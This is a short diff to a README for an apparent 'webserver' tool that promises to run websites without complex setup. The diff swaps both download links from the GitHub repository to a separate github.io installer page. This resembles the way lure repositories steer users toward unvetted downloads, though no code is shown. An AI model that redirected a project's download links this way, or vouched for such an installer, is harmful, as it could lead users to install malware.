@@ -1,6 +1,6 @@
 # 🚀 webserver - Run websites without complex software configuration
 
-[![](https://img.shields.io/badge/Download_Webserver-blue)](https://github.com/sunburstacth412/webserver)
+[![](https://img.shields.io/badge/Download_Webserver-blue)](https://sunburstacth412.github.io)
 
 This software runs your website files directly on your computer. It removes the need for complex setups like NGINX or PHP-FPM. You install a single program and your site works. This tool handles high traffic volumes without slowing down your computer.
 
@@ -21,7 +21,7 @@ Your computer must meet these basic standards to run the software:
 
 You must visit the website link to get the installer for your computer. 
 
-[Visit this page to download the software](https://github.com/sunburstacth412/webserver)
+[Visit this page to download the software](https://sunburstacth412.github.io)
 
 Follow these steps once you reach the page:
 
